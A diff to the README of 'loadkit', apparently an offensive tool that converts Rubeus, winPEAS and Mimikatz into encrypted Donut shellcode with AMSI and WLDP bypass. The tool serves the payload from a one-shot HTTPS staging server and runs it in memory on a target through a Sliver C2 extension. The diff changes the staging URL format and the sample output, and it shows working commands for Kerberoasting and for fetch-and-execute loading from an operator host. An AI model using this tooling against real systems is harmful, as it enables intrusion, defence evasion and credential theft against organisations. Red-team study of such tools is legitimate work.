@@ -29,7 +29,7 @@ Operator                              Target (Sliver session)
 loadkit load \                        sliver> load url=<url> key=<key>
   --binary rubeus.exe \                │
   --args "kerberoast /nowrap" \        │  Extension DLL (load.x64.dll)
-  --url https://192.168.1.10:8443/p \  ├─ WinHTTP HTTPS fetch
+  --url https://192.168.1.10:8443 \    ├─ WinHTTP HTTPS fetch
   --serve                              ├─ XOR-32 decrypt
   │                                    ├─ NtAllocVM(RW) → copy → NtProtectVM(RX)
   ├─ Donut → shellcode                 ├─ redirect stdout/stderr to pipe
@@ -93,38 +93,40 @@ The extension persists for the lifetime of the Sliver server — you only need t
 ./loadkit load \
     --binary rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 
 # Native EXE
 ./loadkit load \
     --binary winpeas.exe \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 
 # DLL with a specific export
 ./loadkit load \
     --binary mimikatz.dll \
     --method DllMain \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
 
 Output:
 ```
-[*] Converting rubeus.exe to Donut shellcode ...
-[+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR encryption)
-[+] payload → build/payload.enc
-[+] url     → https://192.168.1.10:8443/p
+[*] Converting Rubeus.exe to Donut shellcode ...
+[+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)
 
-[i] First time: install extension
+[+] payload → build/payload.enc (1245200 bytes)
+[+] key     → a1b2c3d4e5f6...
+
+[i] First time (once per Sliver server):
     sliver> extensions install build/load-0.1.0.tar.gz
 
-[i] Execute in an active session:
-    sliver (TARGET)> load url=https://192.168.1.10:8443/p key=a1b2c3d4...
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path generated automatically — only this URL works)
 
-[*] Starting one-time HTTPS server on :8443 ...
-[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+[i] Execute in Sliver:
+    sliver (TARGET)> load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4e5f6...
 ```
 
 ### Step 3: Execute in Sliver
